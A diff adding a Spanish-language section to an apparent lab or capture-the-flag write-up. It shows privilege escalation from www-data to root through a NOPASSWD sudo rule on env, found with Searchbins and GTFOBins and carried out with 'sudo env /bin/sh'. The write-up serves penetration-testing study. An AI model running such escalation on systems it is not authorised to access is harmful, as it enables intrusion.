@@ -187,5 +187,58 @@ www-data
 ```
 
 ### **Acceso root**
+#### Enumeración de Privilegios Sudo
+```python
+www-data@c925d2eea10b:/var/www/html/uploads$ sudo -l
+ ```
+
+Este comando muestra que el usuario `www-data` tiene permisos para ejecutar `env` con privilegios de superusuario.
+
+**Salida:**
+
+```python
+sudo -l
+Matching Defaults entries for www-data on c925d2eea10b:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User www-data may run the following commands on c925d2eea10b:
+    (root) NOPASSWD: /usr/bin/env
+```
+
+#### Búsqueda de técnicas de escalada de privilegios con <a href="https://github.com/r1vs3c/searchbins">Searchbins</a>
+
+```python
+~/Upload ᐅ searchbins -b env -f sudo
+```
+
+Searchbins sugiere la técnica que se muestra en la salida para escalar privilegios utilizando `env` cuando se puede ejecutar como superusuario.
+
+**Salida:**
+```python
+
+[+] Binary: env
+
+================================================================================
+[*] Function: sudo -> [https://gtfobins.github.io/gtfobins/env/#sudo]
+
+        | sudo env /bin/sh
+```
+
+#### Ejecución de la Escalada de Privilegios
+
+```python
+www-data@c925d2eea10b:/var/www/html/uploads$ sudo env /bin/sh
+```
+
+Este comando utiliza `env` con privilegios de superusuario para ejecutar un shell con permisos de root.
+
+**Comprobación:**
+```python
+sudo env /bin/sh
+whoami
+root
+```
 
 
